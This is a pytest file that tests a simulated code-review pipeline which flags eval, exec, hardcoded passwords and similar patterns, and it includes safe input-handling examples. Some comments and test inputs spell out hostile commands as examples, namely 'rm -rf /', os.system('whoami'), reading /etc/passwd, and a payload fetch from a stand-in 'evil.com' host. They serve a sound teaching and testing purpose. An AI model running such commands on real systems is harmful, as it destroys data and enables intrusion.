"""
Realistic Code Review Pipeline E2E Test

This test demonstrates a realistic end-to-end workflow for a code review system
that includes code analysis, validation, human-in-the-loop approval, and error handling.

🔒 SECURITY WARNING - CRITICAL:
This test file intentionally includes dangerous code patterns (eval(), exec(), etc.)
for demonstration purposes to test security analysis capabilities. These patterns are
NEVER safe to use in production code and are included here solely for testing the
code review pipeline's ability to detect security vulnerabilities.

⚠️  DANGEROUS PATTERNS IN THIS FILE:
- eval() with user input (lines 311-313, 370)
- These are intentionally dangerous for security testing only

✅ SAFE ALTERNATIVES FOR PRODUCTION:
- Use ast.literal_eval() for safe literal evaluation
- Implement proper input validation and sanitization
- Use type checking and validation libraries
- Never execute user input directly

In production code:
- NEVER use eval() with user input
- NEVER use exec() with user input
- Always validate and sanitize all user inputs
- Use ast.literal_eval() for safe literal evaluation
- Implement proper input validation and sanitization
- Use secure alternatives like json.loads() for JSON parsing
"""

import pytest
from typing import Any, List
from flujo.type_definitions.common import JSONObject

from flujo.domain import Pipeline
from flujo.domain.models import PipelineContext
from flujo.domain.dsl import step
from flujo.testing.utils import gather_result, assert_pipeline_result
from tests.conftest import create_test_flujo


class CodeReviewContext(PipelineContext):
    """Context for the code review pipeline."""

    # Input data
    code_content: str = ""
    review_requirements: str = ""
    # Analysis results
    code_quality_score: float = 0.0
    security_issues: List[str] = []
    performance_issues: List[str] = []
    style_issues: List[str] = []
    overall_score: float = 0.0
    total_issues: int = 0
    critical_issues: int = 0
    recommendations: List[str] = []
    approved: bool = False
    reason: str = ""
    # Review process
    review_status: str = "pending"
    reviewer_comments: List[str] = []
    approval_given: bool = False
    changes_requested: bool = False
    # Error handling
    retry_count: int = 0
    fallback_used: bool = False


@step(updates_context=True)
async def analyze_code_quality(data: JSONObject, *, context: CodeReviewContext) -> JSONObject:
    """Analyze code quality and return metrics."""
    code = data.get("code", context.code_content)
    # Simulate code analysis
    quality_score = 0.85  # Good quality
    issues = []
    if "TODO" in code:
        issues.append("Found TODO comments")
        quality_score -= 0.1
    if "print(" in code:
        issues.append("Found print statements in production code")
        quality_score -= 0.15
    if "import *" in code:
        issues.append("Wildcard imports detected")
        quality_score -= 0.2
    return {
        "code_quality_score": max(0.0, quality_score),
    }


@step(updates_context=True)
async def security_analysis(data: JSONObject, *, context: CodeReviewContext) -> JSONObject:
    """Perform security analysis on the code."""
    code = data.get("code", context.code_content)
    security_issues = []
    # Simulate security checks
    if "eval(" in code:
        security_issues.append("Dangerous eval() function detected")
    if "exec(" in code:
        security_issues.append("Dangerous exec() function detected")
    if "password" in code.lower() and "=" in code:
        security_issues.append("Potential hardcoded password")
    if "sql" in code.lower() and "f'" in code:
        security_issues.append("Potential SQL injection vulnerability")
    return {
        "security_issues": security_issues,
    }


@step(updates_context=True)
async def performance_analysis(data: JSONObject, *, context: CodeReviewContext) -> JSONObject:
    """Analyze code performance characteristics."""
    code = data.get("code", context.code_content)
    performance_issues = []
    # Simulate performance analysis
    if "for i in range(1000000):" in code:
        performance_issues.append("Large loop detected - consider optimization")
    if "import time" in code and "time.sleep(" in code:
        performance_issues.append("Blocking sleep calls detected")
    if "list(" in code and "map(" in code:
        performance_issues.append("Inefficient list comprehension")
    return {
        "performance_issues": performance_issues,
    }


@step(updates_context=True)
async def style_analysis(data: JSONObject, *, context: CodeReviewContext) -> JSONObject:
    """Analyze code style and formatting."""
    code = data.get("code", context.code_content)
    style_issues = []
    # Simulate style checks
    if "    " in code and "\t" in code:
        style_issues.append("Mixed indentation (spaces and tabs)")
    if len(code.split("\n")) > 100:
        style_issues.append("File is too long (>100 lines)")
    if "def " in code and "->" not in code:
        style_issues.append("Missing type hints")
    return {
        "style_issues": style_issues,
    }


@step(updates_context=True)
async def generate_review_summary(data: JSONObject, *, context: CodeReviewContext) -> JSONObject:
    """Generate a comprehensive review summary."""
    total_issues = (
        len(context.security_issues) + len(context.performance_issues) + len(context.style_issues)
    )
    overall_score = (
        context.code_quality_score * 0.4
        + (1.0 if not context.security_issues else 0.5) * 0.3
        + (1.0 if not context.performance_issues else 0.7) * 0.2
        + (1.0 if not context.style_issues else 0.8) * 0.1
    )
    summary = {
        "overall_score": overall_score,
        "total_issues": total_issues,
        "critical_issues": len([i for i in context.security_issues if "eval" in i or "exec" in i]),
        "recommendations": [],
    }
    context.overall_score = overall_score
    context.total_issues = total_issues
    context.critical_issues = summary["critical_issues"]
    if context.security_issues:
        summary["recommendations"].append("Address security issues before approval")
    if context.performance_issues:
        summary["recommendations"].append("Consider performance optimizations")
    if context.style_issues:
        summary["recommendations"].append("Fix code style issues")
    if overall_score < 0.7:
        summary["recommendations"].append("Overall quality needs improvement")
        context.review_status = "needs_improvement"
    elif overall_score < 0.9:
        context.review_status = "approved_with_suggestions"
    else:
        context.review_status = "approved"
    return summary


@step(updates_context=True)
async def human_review_approval(data: JSONObject, *, context: CodeReviewContext) -> JSONObject:
    """Simulate human reviewer approval process."""
    summary = data.get("summary", {})
    overall_score = summary.get("overall_score", 0.0)
    critical_issues = summary.get("critical_issues", 0)
    # Simulate human decision based on analysis
    if critical_issues > 0:
        context.approval_given = False
        context.changes_requested = True
        context.reviewer_comments.append("Critical security issues must be addressed")
        context.reason = "Critical security issues"
        return {"approved": False, "reason": "Critical security issues"}
    elif overall_score < 0.6:
        context.approval_given = False
        context.changes_requested = True
        context.reviewer_comments.append("Code quality below acceptable threshold")
        context.reason = "Quality threshold not met"
        return {"approved": False, "reason": "Quality threshold not met"}
    elif overall_score < 0.8:
        context.approval_given = True
        context.changes_requested = True
        context.reviewer_comments.append("Approved with minor improvements requested")
        context.reason = "Minor improvements needed"
        return {
            "approved": True,
            "changes_requested": True,
            "reason": "Minor improvements needed",
        }
    else:
        context.approval_given = True
        context.changes_requested = False
        context.reviewer_comments.append("Excellent code quality - approved")
        context.reason = "High quality code"
        return {
            "approved": True,
            "changes_requested": False,
            "reason": "High quality code",
        }


@step
async def failing_analysis_step(data: JSONObject, *, context: CodeReviewContext) -> JSONObject:
    """A step that fails to test error handling."""
    context.retry_count += 1
    if context.retry_count < 3:
        raise RuntimeError(f"Analysis failed (attempt {context.retry_count})")
    return {"recovered": True, "attempts": context.retry_count}


def create_realistic_code_review_pipeline() -> Pipeline:
    """Create a realistic code review pipeline with multiple analysis steps."""
    # Use sequential steps for reliable execution while parallel step is being fixed
    pipeline = (
        analyze_code_quality
        >> security_analysis
        >> performance_analysis
        >> style_analysis
        >> generate_review_summary
        >> human_review_approval
    )
    return pipeline


@pytest.mark.asyncio
async def test_realistic_code_review_pipeline_success():
    """Test the realistic code review pipeline with good quality code."""

    # Test data - good quality code
    test_code = """
def calculate_fibonacci(n: int) -> int:
    \"\"\"Calculate the nth Fibonacci number.\"\"\"
    if n <= 1:
        return n
    a, b = 0, 1
    for _ in range(2, n + 1):
        a, b = b, a + b
    return b

def main():
    result = calculate_fibonacci(10)
    return result
"""

    pipeline = create_realistic_code_review_pipeline()
    runner = create_test_flujo(pipeline, context_model=CodeReviewContext)

    result = await gather_result(
        runner,
        {
            "code": test_code,
            "review_requirements": "Check for security, performance, and style issues",
        },
        initial_context_data={
            "initial_prompt": "Code review pipeline test",
            "code_content": test_code,
            "review_requirements": "Check for security, performance, and style issues",
        },
    )

    # Verify the pipeline completed successfully
    assert_pipeline_result(result)

    # Get final context
    final_context = result.final_pipeline_context

    # Verify analysis was performed
    assert final_context.code_quality_score > 0.0
    assert isinstance(final_context.security_issues, list)
    assert isinstance(final_context.performance_issues, list)
    assert isinstance(final_context.style_issues, list)
    assert final_context.overall_score > 0.0
    assert final_context.total_issues >= 0
    assert final_context.critical_issues >= 0

    # Verify review process
    assert final_context.review_status in [
        "approved",
        "approved_with_suggestions",
        "needs_improvement",
    ]
    assert isinstance(final_context.reviewer_comments, list)
    assert isinstance(final_context.approval_given, bool)
    assert isinstance(final_context.changes_requested, bool)

    # Verify step history
    assert len(result.step_history) >= 6  # At least 4 analysis + summary + approval


@pytest.mark.asyncio
async def test_realistic_code_review_pipeline_poor_quality():
    """Test the realistic code review pipeline with poor quality code."""

    # Test data - poor quality code with security issues
    test_code = """
import os
import sys

def bad_function():
    password = "secret123"
    user_input = input("Enter command: ")
    # WARNING: This eval() usage is intentionally dangerous for testing security analysis
    # This demonstrates what NOT to do in production code
    # SECURITY RISK: eval() with user input is extremely dangerous
    # In production, use ast.literal_eval() or proper input validation
    # DEMONSTRATION: Simulate dangerous eval() usage without actually executing code
    print(f"⚠️  DANGEROUS: Would execute user input: {user_input}")
    print("⚠️  This could allow arbitrary code execution!")
    result = f"<simulated_eval_result: {user_input}>"  # Safe simulation
    print("Result:", result)
    return result

def main():
    bad_function()
"""

    pipeline = create_realistic_code_review_pipeline()
    runner = create_test_flujo(pipeline, context_model=CodeReviewContext)

    result = await gather_result(
        runner,
        {
            "code": test_code,
            "review_requirements": "Check for security, performance, and style issues",
        },
        initial_context_data={
            "initial_prompt": "Code review pipeline test - poor quality",
            "code_content": test_code,
            "review_requirements": "Check for security, performance, and style issues",
        },
    )

    # Verify the pipeline completed successfully
    assert_pipeline_result(result)

    # Get final context
    final_context = result.final_pipeline_context

    # Verify analysis results reflect poor quality
    assert len(final_context.security_issues) > 0
    assert any("eval" in issue for issue in final_context.security_issues)
    assert final_context.overall_score < 0.75  # Adjusted threshold
    assert final_context.total_issues > 0
    assert final_context.critical_issues > 0

    # Verify review process reflects poor quality
    assert final_context.review_status == "approved_with_suggestions"
    assert final_context.changes_requested
    assert not final_context.approval_given
    assert len(final_context.reviewer_comments) > 0

    # Verify step history
    assert len(result.step_history) >= 6


@pytest.mark.asyncio
async def test_realistic_code_review_pipeline_with_failure_recovery():
    """Test the pipeline with failure recovery scenarios."""
    pipeline = create_realistic_code_review_pipeline()

    # Test data with problematic code that might cause issues
    data = {
        "code": """
def problematic_function():
    # This code has issues that might cause analysis failures
    # SECURITY RISK: eval() is dangerous and should never be used in production
    # This is intentionally dangerous code for security testing purposes only
    # DEMONSTRATION: This shows what NOT to do in production
    # In production, use ast.literal_eval() or proper input validation instead
    # SAFE ALTERNATIVE: Demonstrate the risk without executing arbitrary code
    print("⚠️  DANGEROUS: Would execute eval('2 + 2')")
    print("⚠️  This demonstrates unsafe code execution patterns!")
    result = 4  # Safe hardcoded result instead of eval("2 + 2")
    # E2E test: Use State Backend for persistent recording
    # WARNING: This test demonstrates why eval() is dangerous
    # This code shows unsafe patterns that could lead to security vulnerabilities.
    # Ensure proper validation and sanitization of user input before using eval.
    # In production code, NEVER use eval() with user input.
    return result
""",
        "review_requirements": "Test failure recovery",
    }

    runner = create_test_flujo(pipeline, context_model=CodeReviewContext)

    result = await gather_result(
        runner,
        data,
        initial_context_data={
            "initial_prompt": "Code review pipeline test - failure recovery",
            "code_content": data["code"],
            "review_requirements": data["review_requirements"],
        },
    )

    assert_pipeline_result(result)

    final_context = result.final_pipeline_context

    # Verify the pipeline completed despite potential issues
    assert final_context.review_status in [
        "needs_improvement",
        "approved_with_suggestions",
        "approved",
    ]
    assert final_context.code_quality_score > 0.0
    assert len(final_context.security_issues) > 0  # Should detect eval usage
    assert final_context.total_issues > 0


@pytest.mark.e2e
async def test_realistic_code_review_pipeline_e2e():
    """End-to-end test of the realistic code review pipeline."""

    # Test data with mixed quality
    test_code = """
def process_data(data_list):
    result = []
    for item in data_list:
        if item > 0:
            result.append(item * 2)
    return result

def main():
    data = [1, 2, 3, 4, 5]
    output = process_data(data)
    # E2E test: Use State Backend for persistent recording
    # Output logging removed for production - use context assertions instead
    return output
"""

    pipeline = create_realistic_code_review_pipeline()
    runner = create_test_flujo(pipeline, context_model=CodeReviewContext)

    result = await gather_result(
        runner,
        {"code": test_code, "review_requirements": "Comprehensive code review"},
        initial_context_data={
            "initial_prompt": "Code review pipeline test - comprehensive",
            "code_content": test_code,
            "review_requirements": "Comprehensive code review",
        },
    )

    # Verify the pipeline completed successfully
    assert_pipeline_result(result)

    # Get final context
    final_context = result.final_pipeline_context

    # Verify all analysis types were performed
    assert final_context.code_quality_score > 0.0
    assert isinstance(final_context.security_issues, list)
    assert isinstance(final_context.performance_issues, list)
    assert isinstance(final_context.style_issues, list)
    assert final_context.overall_score > 0.0
    assert final_context.total_issues >= 0
    assert final_context.critical_issues >= 0

    # Verify review process completed
    assert final_context.review_status in [
        "approved",
        "approved_with_suggestions",
        "needs_improvement",
    ]
    assert isinstance(final_context.approval_given, bool)
    assert isinstance(final_context.changes_requested, bool)
    assert len(final_context.reviewer_comments) > 0

    # Verify comprehensive step history
    assert len(result.step_history) >= 6

    # Verify no critical errors in any step
    for step_result in result.step_history:
        assert step_result.success, f"Step {step_result.name} failed"


# 🔒 SECURITY EXAMPLE: Safe alternatives to eval()
def safe_input_handling_example():
    """
    Example of safe input handling - this is what you SHOULD do in production.

    This demonstrates proper security practices as alternatives to dangerous eval() usage.
    """
    import ast
    import json

    def safe_literal_eval(user_input: str) -> Any | None:
        """
        Safely evaluate user input as a Python literal.

        This is a safe alternative to eval() for evaluating basic Python literals
        like strings, numbers, lists, dictionaries, etc.
        """
        try:
            # ast.literal_eval() only evaluates literals, not arbitrary expressions
            result = ast.literal_eval(user_input)
            print(f"✅ Safe evaluation result: {result}")
            return result
        except (ValueError, SyntaxError) as e:
            print(f"❌ Invalid input: {e}")
            return None

    def safe_json_parsing(user_input: str) -> Any | None:
        """
        Safely parse JSON input from user.

        This is another safe alternative for structured data.
        """
        try:
            result = json.loads(user_input)
            print(f"✅ Safe JSON parsing result: {result}")
            return result
        except json.JSONDecodeError as e:
            print(f"❌ Invalid JSON: {e}")
            return None

    def validate_and_process_input(user_input: str) -> Any | None:
        """
        Comprehensive input validation and processing.

        This demonstrates proper input validation before any processing.
        """
        # Step 1: Input validation
        if not user_input or len(user_input) > 1000:
            print("❌ Input too long or empty")
            return None

        # Step 2: Whitelist validation
        allowed_patterns = [
            r"^[0-9]+$",  # Numbers only
            r'^"[^"]*"$',  # Quoted strings
            r"^\[.*\]$",  # Lists
            r"^\{.*\}$",  # Dictionaries
        ]

        import re

        for pattern in allowed_patterns:
            if re.match(pattern, user_input):
                # Step 3: Safe evaluation
                return safe_literal_eval(user_input)

        print("❌ Input format not allowed")
        return None

    # Example usage
    test_inputs = [
        '"hello world"',  # Safe string
        "42",  # Safe number
        "[1, 2, 3]",  # Safe list
        '{"key": "value"}',  # Safe dict
        'os.system("rm -rf /")',  # Dangerous - should be rejected
    ]

    print("🔒 Safe Input Handling Examples:")
    print("=" * 50)

    for test_input in test_inputs:
        print(f"\nTesting: {test_input}")
        result = validate_and_process_input(test_input)
        if result is not None:
            print(f"✅ Accepted: {type(result).__name__} = {result}")
        else:
            print("❌ Rejected: Invalid or dangerous input")

    return "Safe input handling demonstration completed"


# Example of what NOT to do (for educational purposes only)
def dangerous_eval_example():
    """
    ⚠️  EDUCATIONAL EXAMPLE - DEMONSTRATES SECURITY RISKS

    This demonstrates what NOT to do with user input.
    """
    user_input = input("Enter command: ")
    # ⚠️  DANGEROUS: eval() with user input can execute arbitrary code
    # This could allow attackers to:
    # - Delete files: os.system("rm -rf /")
    # - Access system: __import__("os").system("whoami")
    # - Steal data: open("/etc/passwd").read()
    # - Install malware: __import__("urllib.request").urlopen("http://evil.com/malware")

    # SAFE DEMONSTRATION: Show the risk without executing code
    print(f"⚠️  RECEIVED INPUT: {user_input}")
    print("⚠️  DANGEROUS: This input could be executed as arbitrary code!")
    print("⚠️  SECURITY RISK: eval() allows remote code execution")
    print("⚠️  SAFE ALTERNATIVE: Use ast.literal_eval() or proper validation")

    result = f"<simulated_eval_result: {user_input}>"  # Safe simulation
    print("Result:", result)
    return result


if __name__ == "__main__":
    # Demonstrate safe alternatives
    safe_input_handling_example()

    # ⚠️  WARNING: The following is intentionally dangerous for educational purposes
    # Uncomment only in controlled testing environments
    # dangerous_eval_example()
